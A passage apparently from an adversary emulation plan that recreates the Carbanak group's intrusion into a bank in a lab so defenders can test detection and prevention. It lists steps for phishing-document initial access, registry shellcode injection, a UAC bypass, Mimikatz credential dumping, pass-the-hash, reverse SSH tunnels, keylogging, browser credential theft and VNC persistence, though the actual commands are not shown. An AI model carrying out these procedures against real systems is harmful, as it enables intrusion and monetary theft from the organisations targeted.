which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found here."]},{"l":"Overview","p":["Emulation of Carbanak usage of tools such as Carbanak malware, Mimikatz, and PsExec.","Scenario begins after delivery of a reverse shell payload distributed via spearphishing","Targeted attack of a financial institution with the explicit goal of monetary theft","Designed to assess detection capabilities"]},{"l":"Contents","p":["Step 0 - Start C2 Server","Step 1 - Initial Access","Step 2 - Local Discovery and Collection","Step 3 - 2nd Stage RAT","Step 4 - Domain Discovery and Credential Dumping","Step 5 - Lateral Movement","Step 6 - Discovery","Step 7 - Lateral Movement - CFO","Step 8 - Execution","Step 9 - Collection","Step 10 - VNC Persistence"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 1 Infrastructure documentation."]},{"i":"step-0---start-c2-server","l":"Step 0 - Start C2 Server","p":["Before the scenario begins, the attacker needs to start their C2 server to catch their first beacon from the target."]},{"l":"Procedures"},{"i":"0a---start-c2-server","l":"0.A - Start C2 Server","p":["On the Attack Platform:","Start a new tmux session","tmux","Start the C2 Server"]},{"i":"step-1---initial-breach","l":"Step 1 - Initial Breach","p":["The scenario begins with an initial breach, where a legitimate user opens a Word document and clicks on ( T1204/ T1204.002) an embedded OLE object, causing an encoded ( T1027) Visual Basic script contained within the object to execute ( T1059.005).","On execution, this script decodes ( T1140) and writes two files to disk, starter.vbs and TransBaseOdbcDriver.js. The script then executes starter.vbs, which in turn executes TransBaseOdbcDriver.js( T1059.007). TransBaseOdbcDriver.js is a RAT that establishes encrypted ( T1563.002) command and control with the attacker over HTTP/S (TCP 443) ( T1071.001)."]},{"i":"procedures-1","l":"Procedures"},{"i":"1a---user-execution-malicious-file-using-microsoft-word-t1204002","l":"1.A - User Execution: Malicious File (using Microsoft Word) (T1204.002)","p":["If testing with Microsoft Word, perform the following. If not, perform Step 1.A* instead.","On the Attack Platform:","Open a new tmux terminal","Copy 1-list.rtf to domain_admin's Desktop on hrmanager.","Provide domain_admin's password when prompted:","domain_admin_password","On hrmanager:","Login to victim workstation as domain_admin","Double-click 1-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click the text that says \"Double Click Here To Unlock\"","When prompted to run a script, click 'open'","Click \"ok\" when the fake error message displays","You should receive a callback on the C2 server."]},{"i":"1a---user-execution-malicious-file-without-using-microsoft-word","l":"1.A* - User Execution: Malicious File (without using Microsoft Word)","p":["Perform the following if you're testing without Office licenses:","On the Attack Platform:","Open a new tmux terminal","Copy drop_payloads.vbe to hrmanager","Provide domain_admin's password when prompted:","domain_admin_password","On hrmanager:","Login to victim workstation as domain_admin","Open cmd.exe","Manually execute VB script","Make sure you click the 'ok' on the error message box! If you don't, the payload won't execute!"]},{"l":"Cited Intelligence","p":["Carbanak has created weaponized DOCX and RTF files with malicious files embedded in the documents. Opening and clicking on the image in the file drops and executes an encoded VBScript payload. 13, 8","Carbank has used malicious Word documents that when opened drop and execute VBS and JS scripts. 4"]},{"i":"step-2---target-assessment","l":"Step 2 - Target Assessment","p":["The attacker executes several discovery scripts that are part of the RAT, which gather information such as device hostname, username, domain ( T1033), CPU architecture ( T1082), and currently running processes ( T1057). These scripts obtain this information by making WMI queries ( T1047) and querying ActiveX networking attributes.","The attacker then uploads ( T1105) and executes a PowerShell script ( T1086), which takes a screenshot of the user's desktop ( T1113) and writes the screenshot to disk. The attacker then downloads the resulting screenshot over the existing C2 channel ( T1041), and prepares a handler for the next C2 callback they will receive."]},{"i":"procedures-2","l":"Procedures"},{"i":"2a---local-discovery-t1033-t1082-t1057","l":"2.A - Local Discovery (T1033, T1082, T1057)","p":["On the Attack Platform:","Switch back to the Carbanak C2 server tmux terminal","Get system information"]},{"i":"2b---screen-capture-t1113","l":"2.B - Screen Capture (T1113)","p":["Upload screenshot script","Take Screenshot","Exfil screenshot file over existing C2 channel","Switch to the other tmux terminal","Verify \"screenshot__.png\" download worked","Start Metasploit","Set up TCP listener for Meterpreter on TCP port 8080","This handler is used for Meterpreter callbacks in steps 3 and 5.","Set up HTTP listener for Meterpreter on TCP port 80","This handler is used for a Meterpreter callback in step 8.","Switch back to C2 server tmux window"]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Carbanak malware has the capability to take screen captures of the victim's desktop. 17","Carbanak VBScript payloads are capable of stealing various system information. Carbanak has also used PowerShell scripts to screenshot victim's desktop and exfil the data using HTTP. 8"]},{"i":"step-3---deploy-toolkit","l":"Step 3 - Deploy Toolkit","p":["The attacker prepares and deploys a second stage RAT on the victim. First, they write obfuscated ( T1027) shellcode to the Windows Registry using reg.exe( T1112).","The attacker then uploads to disk ( T1105) and executes a PowerShell script ( T1059.001) called LanCradDriver.ps1. This script reads the shellcode from the registry ( T1012), decodes and decrypts it ( T1140), and then finally injects the shellcode into the current PowerShell process, executing it via a call to CreateThread ( T1055). After execution, the attacker receives a callback over TCP port 8080 ( T1571)."]},{"i":"procedures-3","l":"Procedures"},{"i":"3a---stage-2nd-stage-rat-t1112","l":"3.A - Stage 2nd stage RAT (T1112)","p":["Write shellode to Registry","Note that the shellcode is:","encrypted: XOR with key 'xyz'","compressed: Gzip","encoded: base64","(ATTCK Evals)"]},{"i":"3b---execute-2nd-stage-rat-t1012-t1055","l":"3.B - Execute 2nd stage RAT (T1012, T1055)","p":["Upload shellcode execution script","Execute shellode script","Switch to the Meterpreter window","Switch to current Meterpreter session"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["Carbanak has used PowerShell to execute custom scripts. 4","Carbanak has employed multiple methods of obfuscation to conceal their activities. 1","Carberp has created Registry keys to hide and execute PowerShell commands that execute binary shellcode stored in another key. 11"]},{"i":"step-4---escalate-privileges","l":"Step 4 - Escalate Privileges","p":["In this step, the attacker performs additional discovery before elevating privileges using a UAC bypass to dump credentials.","First, they examine local files in domain_admin's home directory ( T1083). The attacker then calls the Get-NetComputer function from the PowerView library, which queries Active Directory objects to return a list of hostnames in the current domain ( T1018). The attacker then executes Find-LocalAdminAccess, also from PowerView, to confirm that the attacker has administrator access on the current workstation ( T1069).","With this knowledge, the attacker uploads two files ( T1105) to perform credential dumping: rad353F7.ps1(UAC bypass) and smrs.exe(customized Mimikatz, called ATTACKKatz in this repository). The attacker executes rad353F7.ps1 via PowerShell ( T1059.001), which in turn executes smrs.exe in high integrity ( T1549.002). smrs.exe dumps plaintext credentials for the current user ( T1003.001).","FAQ About ATTACKkatz.exe","attackkatz (smrs.exe in step 4.B) leverages the Logonpasswords functionality of Mimikatz to obtain passwords. This dumps LSASS memory to obtain credentials for users on the domain that have logged in to this machine ( T1003.001)."]},{"i":"procedures-4","l":"Procedures"},{"i":"4a---local-and-domain-discovery-t1083-t1018-t1069","l":"4.A - Local and Domain Discovery (T1083, T1018, T1069)","p":["Look for files in user home directory","Load PowerShell into memory","Import PowerView into memory","Execute PowerView's Get-NetComputer from memory","Execute PowerView's Find-LocalAdminAccess from memory and write its output to a file on disk","You will likely see an error:","Error running command powershell_execute: Rex::TimeoutError Operation timed out.","That's okay - don't freak out!","Meterpreter thinks the script timed out, but it is still running in the background.","Wait 60 seconds to allow the script to finish.","Read the contents of the output file"]},{"i":"4b---uac-bypass-and-credential-dumping-t1549002-t1003001","l":"4.B - UAC Bypass and Credential Dumping (T1549.002, T1003.001)","p":["Upload the UAC Bypass script to hrmanager as rad353F7.ps1","Upload attackkatz.exe to hrmanager as smrs.exe","Execute the UAC Bypass to script to run smrs.exe in an elevated context","Read Mimikatz output","Note that we now have domain admin creds in hash form and plaintext"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["The Carbank malware contains a UAC bypass. 16","Carbanak has used Mimikatz to steal clear text local passwords. 6, 8, 10, 11, 14","Carbank operations have included customized versions of PowerSploit. 4"]},{"i":"step-5---expand-access","l":"Step 5 - Expand Access","p":["The attacker uploads several tools to prepare for lateral movement ( T1105, ( T1570)), after which they use plink.exe to SSH into bankfileserver( T1021.004), where they list running processes ( T1057) and browse local files ( T1083). The contents of two files they discover provide them with information needed to target the CFO's computer. They then execute nslookup to get the domain controller's IP address ( T1018).","With knowledge of the DC IP address, the attacker uses PsExec.py, providing a password hash for authentication ( T1550), to gain a shell on the DC ( T1569.002, T1021.002). They then upload and execute a second stage payload, Tiny.exe, over this SMB channel to receive a more powerful shell."]},{"i":"procedures-5","l":"Procedures"},{"i":"5a---ingress-and-lateral-tool-transfer-t1105-t1570","l":"5.A - Ingress and Lateral Tool Transfer (T1105, (T1570))","p":["Upload pscp.exe to hrmanager","Upload psexec.py to hrmanager","Upload impacket_exe to hrmanager as runtime","Upload plink.exe to hrmanager","Upload tiny.exe to hrmanager","From Meterpreter prompt, drop into an interactive shell","Change into the TransbaceOdbcDriver directory","Use PSCP.exe to copy tools to Linux host","Provide domain_admin's password when prompted:","domain_admin_password","If prompted to store key in cache, hit no; this reduces the amount of artifacts we're generating."]},{"i":"5b---lateral-movement-via-ssh-t1021004","l":"5.B - Lateral Movement via SSH (T1021.004)","p":["Use plink.exe to SSH into CentOS","Enter password when prompted.","Your prompt should look like the following when done:","[domain_admin@bankfileserver ~]$","Process Discovery","Directory and File Discovery","Read data from local system","DNS Lookup: Domain Controller"]},{"i":"5c---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550","l":"5.C - Lateral Movement via PsExec + Pass-the-Hash (T1569.002, T1550)","p":["Change to the tmp directory","Modify permissions on runtime to make it world-executable","Use runtime to execute psexec.py with a password hash","You should have a shell on the domain controller now.","Serve TinyMet over SMB","From pass-the-hash shell:","Mount attacker SMB share","Verify upload worked:","Execute TinyMet","You will see a new Meterpreter session.","Pull back to interact with the domain controller","Pay attention to your terminal prompts:","You should now be at the msf prompt:","msf"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Carbanak has used psexec, or other variations, to perform lateral movement and execute remote commands. 6, 10, 11","Carbanak is known to use TinyMet as a stager to execute Meterpreter as a stage 1 RAT. 3","Carbanak has downloaded and utilized pscp and used stolen credentials to access Linux systems via SSH. 10","Carbanak has performed pass-the-hash. 4"]},{"i":"step-6---discover-potential-targets","l":"Step 6 - Discover Potential Targets","p":["The attacker begins targeting the CFO user from the domain controller. First, they execute Get-AdComputer from memory to get detailed information about the CFO user's computer ( T1018), learning their username. The attacker then executes Get-NetUser from the PowerView library to gather information about the user ( T1087.002)."]},{"i":"procedures-6","l":"Procedures"},{"i":"6a---remote-system-discovery-t1018-t1087002","l":"6.A - Remote System Discovery (T1018, T1087.002)","p":["Interact with bankdc Meterpreter session","Load PowerShell into memory","Execute Get-ADComputer against the cfo workstation from memory","Import PowerView into memory","Execute PowerView's Get-NetUser from memory"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["Carbanak is known to use Powershell to execute custom scripts that can perform discovery techniques. 4, 6","Carbank operations have included customized versions of PowerSploit. 4"]},{"i":"step-7---setup-persistence","l":"Step 7 - Setup Persistence","p":["Using the information gained in the previous step, the attacker laterally moves to the CFO workstation. They upload plink.exe to the domain controller ( T1105), and use it to setup a reverse SSH tunnel to the attacker platform ( T1572, T1021.004). The attacker then connects to the DC through this SSH tunnel using RDP ( T1021.001). Once on the DC, they execute qwinsta to confirm that the CFO user is not logged into their machine ( T1033), after which they RDP into the CFO workstation using domain admin credentials ( T1078.002). Lastly, the attacker establishes persistence on the CFO workstation by downloading a reverse shell, writing a starter file, and then adding a Registry Run Key to automatically execute the starter file ( T1547.001)."]},{"i":"procedures-7","l":"Procedures"},{"i":"7a---rdp-through-reverse-ssh-tunnel-t1572-t1021001","l":"7.A - RDP through Reverse SSH Tunnel (T1572, T1021.001)","p":["Upload plink.exe to Domain Controller","Spawn an interactive shell","Setup reverse SSH tunnel","Decline cache key","Your prompt should now look like: $","RDP to DC","From your Ubuntu VM:","Close your RDP session to hrmanager","RDP into the DC, using your SSH tunnel:","Accept any certificate warnings","RDP will be slower than usual because we're going through an SSH tunnel"]},{"i":"7b---lateral-movement-to-cfo-via-rdp-t1021001","l":"7.B - Lateral Movement to CFO via RDP (T1021.001)","p":["You should have a RDP session on the Domain controller.","Open Administrative PowerShell","Check that CFO is NOT logged in currently","Close PowerShell","From the domain controller, open the RDP client","Enter the following creds:","Make sure you are logging in as domain_admin and NOT cfo_user","You should now have a nested RDP session to the CFO workstation as user <domain_admin>"]},{"i":"7c---registry-persistence-t1547001","l":"7.C - Registry Persistence (T1547.001)","p":["Open cmd.exe","CONFIRM YOU'RE ON CFO BEFORE PROCEEDING","Copy Java-Update.exe from the Attack Platform","If applicable, answer yes to \" Are you sure you want to continue connecting?\" Keystrokes may not appear, but they are being captured.","When prompted for creds, select the Terminal Icon > Edit > Paste:","attacker_ssh_user_password","Enter the creds manually if copy-paste doesn't work.","Sometimes the SSH client throws 'Protocol Failure' errors. You should be fine as long as Java-Update.exe is there and the file size is the 293,272.","Verify Java-Udpdate.exe downloaded correctly","The file size should be '293,272':","Run VBS script to launch JavaUpdate.exe","Copy and paste this VBS script into the CFO CMD window.","This script spawns Java-Update.exe in a hidden window.","Set Registry Persistence for CFO User"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["Carbanak has used plink and other malware to create reverse SSH tunnels. 11, 10","Carbanak has used remote desktop to access internal hosts. 1","Carbanak has used Registry Run keys to establish persistence. 8"]},{"i":"step-8---gain-covert-access-to-target","l":"Step 8 - Gain Covert Access to Target","p":["After setting up the registry persistence, the attacker waits for the persistence to be executed. This occurs when the CFO user logs on to their workstation ( T1547.001), resulting in a new HTTPS reverse shell within the CFO user's context (T 1071.001)."]},{"i":"procedures-8","l":"Procedures"},{"i":"8a---execute-registry-persistence-on-cfo-t1547001","l":"8.A - Execute Registry Persistence on CFO (T1547.001)","p":["Reboot CFO","Close the BankDC RDP Session","Punt Meterpreter Sessions","Switch to the Attack Platform terminal","[ $ ]","Exit shells within Meterpreter session Pay attention to your terminal prompt:","Background Meterpreter session","Kill meterpreter sessions","RDP into CFO as cfo_user","Note that during this step the \"real\" CFO is logging in.","This is not \"red team activity\".","Switch back to your Attack Platform terminal","You should receive a new Meterpreter callback within a minute or two."]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["Carbanak has used wscript to execute various commands. 8"]},{"i":"step-9---profile-a-victim-user","l":"Step 9 - Profile a Victim User","p":["Using the reverse shell within the CFO user's context, the attacker collects information needed to wire money to illicit accounts. The attacker performs keylogging ( T1056.001) and screen capturing ( T1113) to monitor the CFO user's behavior, after which they steal the user's credentials from their web browser ( T1555.003). Lastly, the attacker cleans up artifacts they produced on the CFO workstation ( T1070.004)."]},{"i":"procedures-9","l":"Procedures"},{"i":"9a---user-monitoring---t1056001-t1113","l":"9.A - User Monitoring - (T1056.001, T1113)","p":["Background Meterpreter prompt","Begin capturing the CFO's screen using Metasploit's screen_spy module","Ensure module worked","Execute keylogger.exe","Get Meterpreter PID","If you see a wall of \"screenshot text\", you know it worked","If your shell seems to be missing basic commands, wait 2 minutes and try again. Sometimes Meterpreter just needs additional time to load its standard API.","Interact with Meterpreter session","msf","Read keylogger dump","Role play as CFO","Stop the keylogger process","Switch back to Meterpreter session","Switch back to the Attack Platform after 60 seconds. It will seem like a long time, just be patient","Switch to CFO RDP Session; you're now role playing as the CFO.","The Meterpreter process will migrate to a new process before beginning the screen capture. Wait for the screen capture to start before continuing to the next step.","Upload keylogger.exe to cfo as DefenderUpgradeExec.exe","Your prompt should now show:"]},{"i":"9b---credentials-from-web-browsers-t1070004","l":"9.B - Credentials from Web Browsers (T1070.004)","p":["Upload dumpWebCreds.exe to cfo as infosMin48.exe","Execute infosMin48.exe","Delete dropped files"]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["Carbanak is known to deploy software that can monitor a user's keystrokes as well as capturing video recordings of bank employees. 6","Carbank malware can inject payloads into processes. 7","Carbanak has tools that are built for collecting credentials from browsers and applications. 11, 10"]},{"i":"step-10---impersonate-victim","l":"Step 10 - Impersonate Victim","p":["Having all the information needed to transfer money as the CFO user, all the attacker needs now is the ability to directly interact with the Payment Transfer System as the CFO. To do this, the attacker sets up VNC persistence to gain desktop access. They upload a Tight VNC installer along with a registry key file used to configure VNC settings ( T1105). They then make a firewall rule to allow inbound connections to the VNC server ( T1562.004), and finally install VNC ( T1543.003) before deleting their previously used registry persistence ( T1112).","With these steps completed, the attacker is able to log in to the CFO workstation using the CFO user's credentials ( T1078) through a VNC client ( T1021.005) and complete their objective."]},{"i":"procedures-10","l":"Procedures"},{"i":"10a---install-vnc-persistence-t1543003-t1021005","l":"10.A - Install VNC Persistence (T1543.003, T1021.005)","p":["Upload Tight VNC installer cfo","Upload VNC settings registry file","Background session","Your prompt should now show:","msf","Make firewall rule to allow TightVNC Server using Metasploit's run_as module","Install VNC using Metasploit's run_as module","Disable VNC authentication and prompts using Metasploit's run_as module","Delete Registry Persistence using Metasploit's run_as module","Punt the Meterpreter session, we don't need it anymore","Reboot CFO","Note: This is NOT in scope for the evaluation!","Switch to the CFO RDP session, open cmd.exe and paste the following.","Provide domain_admin's password when prompted:","domain_admin_password"]},{"i":"10b---use-vnc-persistence-t1021005","l":"10.B - Use VNC Persistence (T1021.005)","p":["On your Ubuntu machine:","Setup an SSH tunnel to forward VNC through the Attack Platform","Provide the attacker password when prompted.","Open a VNC client","Set the target to 127.0.0.1:12345 and connect","Within the VNC session:","Enter the CFO user's credentials","Open Payment Transfer System","Pretend to transfer money to a hostile account"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["Carbanak malware includes a VNC module for taking control of a victim's desktop and establishing persistence. 8, 3","Carbanak has installed Ammyy Admin remote desktop control software. 8, 14, 6, 3","Carbanak malware can use netsh to add firewall exclusions. 14"]}],[{"l":"Scenario 1 Infrastructure","p":["The infrastructure listed below is specific to Scenario 1, and assumes that the target environment is configured to only capture detections, rather than to take protective/preventative action. However, the infrastructure for Scenario 2 is a subset of the infrastructure described here. The same configuration described here can be used for Scenario 2 as well.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating Carbanak to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"Emulation Team Infrastructure","p":["Attacker Desktop: tested and executed on Ubuntu 20.04 LTS","Remote Desktop Client","xfreerdp","VNC Client","TightVNC","Attack Platform: tested and executed on Kali Linux 2019.1","C2 Frameworks","ATT&CK Evals Carbanak C2 Server","Metasploit Framework","tmux"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configuration:","Red Team System","IP Address","Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model malware previously used by Carbanak.","Pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4.","If you would like to build the payloads yourself, please make the necessary adjustments to the payload source to match your environment."]},{"l":"Attack Platform Setup","p":["Download the Carbanak ATTACK Evaluations Library to the home directory","Enable SSH Port Forwarding","Add low privilege SSH user","Enable Metasploit PostGRES database","Stage certain files for download","Generate SSH key to copy into domain"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2019 1809","HR Manager Workstation: tested and executed on Windows 10 1909","CFO Workstation: tested and executed on Windows 10 1909","Domain user with local admin access on only this machine","Bank File Server: tested and executed on CentOS 7.7"]},{"l":"Target Infrastructure Configuration","p":["This methodology assumes the following hostname configurations:","Target System","Hostname","Domain Controller","bankdc","HR Manager Workstation","hrmanager","CFO Workstation","cfo","Bank File Server","bankfileserver"]},{"l":"Domain Controller Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"HR Manager Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Copy newly generated SSH keypair from attacker platform to the following directory:","Disable OLE Security to enable execution of initial access payload","The set-OLEsecurity.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"CFO Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Give the CFO user RDP privileges on only this machine by adding them to the following local groups:","Copy Payment Transfer System executable onto Desktop of CFO user.","Cache CFO User's credentials in Microsoft Edge:"]},{"l":"Bank File Server Setup","p":["Ensure the server is domain joined to the rest of the domain:","https://www.redhat.com/sysadmin/linux-active-directory","Copy the following prop files to the /var/tmp directory:","Copy the newly generated SSH keypair's public key id_rsa.pub to the SSH Authorized Keys file:","/home/domain_user/.ssh/authorized_keys"]},{"l":"Setup Automation","p":["The setup-teamsherver.sh and setup-winhosts.ps1 scripts in the setup folder can be used to automate this process. These scripts use the default hostnames, but require usernames and host IP addresses to be substituted in place of placeholder values.","Run setup-teamserver.sh on the Attack Platform.","Note: The script assumes that this repo is downloaded to the user's home directory.","Run setup-winhosts.ps1 on the Domain Controller."]}],[{"l":"Scenario 2"},{"l":"Preface","p":["For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.","While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that has protective/preventative defense measures enabled. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.","This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found here."]},{"l":"Overview","p":["Emulation of Carbanak usage of tools such as Carbanak malware, Mimikatz, and PsExec.","Scenario begins after delivery of a reverse shell payload distributed via spearphishing","Targeted attack of a financial institution with the explicit goal of monetary theft","Split into distinct steps that can be run independently of other steps","Designed to assess protective/preventative defense measures"]},{"l":"Contents","p":["Step 1 - Initial Access & Collection","Step 2 - Registry Shellcode and Discovery","Step 3 - Credential Dumping","Step 4 - Lateral Movement","Step 5 - Credential Access"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 2 Infrastructure documentation."]},{"i":"test-1-initial-access-with-embedded-vbe-in-word-document","l":"Test 1: Initial Access with Embedded VBE in Word Document","p":["The scenario begins with an initial breach, where a legitimate user opens a Word document and clicks on ( T1204/ T1204.002) an embedded OLE object, causing an encoded ( T1027) Visual Basic script contained within the object to execute ( T1059.005).","On execution, this script decodes ( T1140) and writes two files to disk, starter.vbs and TransBaseOdbcDriver.js. The script then executes starter.vbs, which in turn executes TransBaseOdbcDriver.js( T1059.007). TransBaseOdbcDriver.js is a RAT that establishes encrypted ( T1563.002) command and control with the attacker over HTTP/S (TCP 443) ( T1071.001).","The attacker then executes several discovery scripts that are part of the RAT, which gather information such as device hostname, username, domain ( T1033), CPU architecture ( T1082), and currently running processes ( T1057). These scripts obtain this information by making WMI queries ( T1047) and querying ActiveX networking attributes.","Finally, the attacker uploads ( T1105) and executes a PowerShell script ( T1086), which takes a screenshot of the user's desktop ( T1113) and writes the screenshot to disk. The attacker then downloads the resulting screenshot over the existing C2 channel ( T1041).","This step consists of behaviors found in Steps 0, 1, and 2 of Scenario 1."]},{"l":"Procedures"},{"i":"1a---start-c2-server","l":"1.A - Start C2 Server","p":["On the Attack Platform:","Start a new tmux session","tmux","Start the C2 Server"]},{"i":"1b---user-execution-malicious-file-using-microsoft-word-t1204002","l":"1.B - User Execution: Malicious File (using Microsoft Word) (T1204.002)","p":["If testing with Microsoft Word, perform the following. If not, perform Step 1.B* instead.","On the Attack Platform:","Open a new tmux terminal","Copy 1-list.rtf to domain_admin's Desktop on hrmanager.","Provide domain_admin's password when prompted:","domain_admin_password","On hrmanager:","Login to victim workstation as domain_admin","Double-click 1-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click the text that says \"Double Click Here To Unlock\"","When prompted to run a script, click 'open'","Click \"ok\" when the fake error message displays","You should receive a callback on the C2 server."]},{"i":"1b---user-execution-malicious-file-without-using-microsoft-word","l":"1.B* - User Execution: Malicious File (without using Microsoft Word)","p":["Perform the following on hrmanager if you're testing without Office licenses:","On the Attack Platform:","Open a new tmux terminal","Copy drop_payloads.vbe to hrmanager","Provide domain_admin's password when prompted:","domain_admin_password","On hrmanager:","Login to victim workstation as domain_admin","Open cmd.exe","Manually execute VB script","Make sure you click the 'ok' on the error message box! If you don't, the payload won't execute!"]},{"i":"1c---local-discovery-t1033-t1082-t1057","l":"1.C - Local Discovery (T1033, T1082, T1057)","p":["On the Attack Platform:","Switch back to the Carbanak C2 server tmux window","Get system information"]},{"i":"1d---screen-capture-t1113","l":"1.D - Screen Capture (T1113)","p":["Upload screenshot script","Take Screenshot","Exfil screenshot file over existing C2 channel","Switch to the other tmux terminal","Verify \"screenshot__.png\" download worked","Exit tmux Window","Kill current session from C2 server","Exit C2 Server","Close tmux session","Close hrmanager RDP session"]},{"l":"Cited Intelligence","p":["Carbanak has created DOCX and RTF files with malicious files embedded in the documents. The user will click on an image which drops a VBS and builds a JScript RAT 13"]},{"i":"test-2-registry-shellcode-and-execution","l":"Test 2: Registry Shellcode and Execution","p":["The attacker prepares and deploys a second stage RAT on the victim. First, they write obfuscated ( T1027) shellcode to the Windows Registry using reg.exe( T1112).","The attacker then executes a PowerShell blob ( T1059.001) that reads the shellcode from the registry ( T1012), decodes and decrypts it ( T1140), and then finally injects the shellcode into the current PowerShell process, executing it via a call to CreateThread ( T1055). After execution, the attacker receives a callback over TCP port 8080 ( T1571).","With this new 2 nd stage RAT, the attacker examines local files in domain_admin's home directory ( T1083). The attacker then calls the Get-NetComputer function from the PowerView library, which queries Active Directory objects to return a list of hostnames in the current domain ( T1018). The attacker then executes Find-LocalAdminAccess, also from PowerView, to confirm that the attacker has administrator access on the current workstation ( T1069).","This step consists of behaviors found in Steps 3 and 4 of Scenario 1."]},{"i":"procedures-1","l":"Procedures"},{"i":"2a---start-c2-handler","l":"2.A - Start C2 Handler","p":["On the Attack Platform:","Start Metasploit","Set up TCP listener for Meterpreter on TCP port 8080"]},{"i":"2b---stage-2nd-stage-rat-t1112","l":"2.B - Stage 2nd stage RAT (T1112)","p":["On hrmanager:","Login to victim workstation as domain_admin","Open Administrative PowerShell","Write shellode to Registry","Note that the shellcode is:","encrypted: XOR with key 'xyz'","compressed: Gzip","encoded: base64","designed to connect back to 192.168.0.4"]},{"i":"2c---execute-2nd-stage-rat-t1012-t1055","l":"2.C - Execute 2nd stage RAT (T1012, T1055)","p":["In the PowerShell window, copy, paste, and run the following PowerShell Blob to execute the Registry shellcode:","On the Attack Platform:","Interact with new Meterpreter session","Check Meterpreter session status"]},{"i":"2d---local-and-domain-discovery-t1083-t1018-t1069","l":"2.D - Local and Domain Discovery (T1083, T1018, T1069)","p":["Look for files in user home directory","Load PowerShell into memory","Import PowerView into memory","Execute PowerView's Get-NetComputer from memory","Execute PowerView's Find-LocalAdminAccess from memory and write its output to a file on disk","You will likely see an error:","Error running command powershell_execute: Rex::TimeoutError Operation timed out.","That's okay - don't freak out!","Meterpreter thinks the script timed out, but it is still running in the background.","Wait 60 seconds to allow the script to finish.","Read the contents of the output file","Exit the Meterpreter session","Exit Metasploit","Close hrmanager RDP session"]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Carbanak is known to rely on Powershell to execute custom scripts and download 2nd stage RATs. 4, 6","Carbanak will employ multiple methods of obfuscation to conceal their activities. 1"]},{"i":"test-3-uac-bypass-and-credential-dumping","l":"Test 3: UAC Bypass and Credential Dumping","p":["The attacker uploads two files ( T1105) to perform credential dumping: rad353F7.ps1(UAC bypass) and smrs.exe(customized Mimikatz, called ATTACKKatz in this repository). The attacker executes rad353F7.ps1 via PowerShell ( T1059.001), which in turn executes smrs.exe in high integrity ( T1549.002). smrs.exe dumps plaintext credentials for the current user ( T1003.001).","FAQ About ATTACKkatz.exe","attackkatz (smrs.exe in step 4.B) leverages the Logonpasswords functionality of Mimikatz to obtain passwords. This dumps LSASS memory to obtain credentials for users on the domain that have logged in to this machine ( T1003.001).","This step consists of behaviors found in Step 4 of Scenario 1."]},{"i":"procedures-2","l":"Procedures"},{"i":"3a---uac-bypass-and-credential-dumping-t1549002-t1003001","l":"3.A - UAC Bypass and Credential Dumping (T1549.002, T1003.001)","p":["On hrmanager:","Login to victim workstation as domain_admin","Confirm that the following path is present via file explorer:","If not, create it with CMD:","On the Attack Platform:","Upload UAC Bypass script to hrmanager","Use domain_admin's password when prompted.","domain_admin_password","Upload Mimikatz (custom) to hrmanager","Back on hrmanager:","Execute the UAC Bypass script from a PowerShell window:","Read Mimikatz output","Close all windows on hrmanager and close the RDP session"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["The Carbank malware contains a UAC bypass. 16","Carbanak is known to use Mimikatz to facilitate privilege escalation. 6, 8"]},{"i":"test-4-lateral-movement-via-pass-the-hash","l":"Test 4: Lateral Movement via Pass-the-Hash","p":["The attacker uses PsExec.py, providing a password hash for authentication ( T1550), to gain a shell on the DC from bankfileserver( T1569.002, T1021.002). They then upload and execute a second stage payload, Tiny.exe, over this SMB channel to receive a more powerful shell.","This step consists of behaviors found in Step 5 of Scenario 1."]},{"i":"4a---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550","l":"4.A - Lateral Movement via PsExec + Pass-the-Hash (T1569.002, T1550)","p":["On the Attack Platform:","Start tmux if it is not already started","tmux","Start Metasploit","Set up TCP listener for Meterpreter on TCP port 8080","Open a new tmux terminal","Copy needed files to the local staging folder (/tmp/)","SCP those files to bankfileserver","Enter domain_admin's password when 